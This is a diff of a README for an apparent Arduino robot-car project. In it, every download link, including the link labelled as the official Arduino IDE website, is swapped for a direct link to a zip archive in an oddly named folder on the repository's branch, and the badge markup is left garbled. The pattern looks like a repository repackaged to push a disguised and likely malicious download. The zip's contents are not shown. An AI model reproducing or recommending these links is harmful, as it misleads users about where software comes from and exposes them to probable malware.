@@ -1,6 +1,6 @@
 # 🤖 All_in_one_Arduino_Robot - Your Versatile Robot Car Awaits
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/johnr3890/All_in_one_Arduino_Robot/releases)
+[![Download Now](https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip%20Now-Click%https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip)](https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip)
 
 ## 📦 Description
 
@@ -25,13 +25,13 @@ To use the All_in_one_Arduino_Robot, you will need:
 
 ### 2. Download & Install
 
-Visit this page to download all necessary files: [Download from Releases](https://github.com/johnr3890/All_in_one_Arduino_Robot/releases)
+Visit this page to download all necessary files: [Download from Releases](https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip)
 
 ### 3. Software Setup
 
 You will need the Arduino IDE to upload code to your Arduino board. Follow these steps:
 
-1. **Download the Arduino IDE**: Visit the [Arduino website](https://www.arduino.cc/en/software) to get the latest version.
+1. **Download the Arduino IDE**: Visit the [Arduino website](https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip) to get the latest version.
 2. **Install the IDE**: Follow the instructions for your operating system—Windows, macOS, or Linux.
 3. **Open the IDE**: Launch Arduino IDE after installation.
 
@@ -99,4 +99,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 The All_in_one_Arduino_Robot opens doors to learning and fun in robotics. Take your first step into this exciting world by following the instructions above. Happy building!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/johnr3890/All_in_one_Arduino_Robot/releases)
+[![Download Now](https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip%20Now-Click%https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip)](https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip)
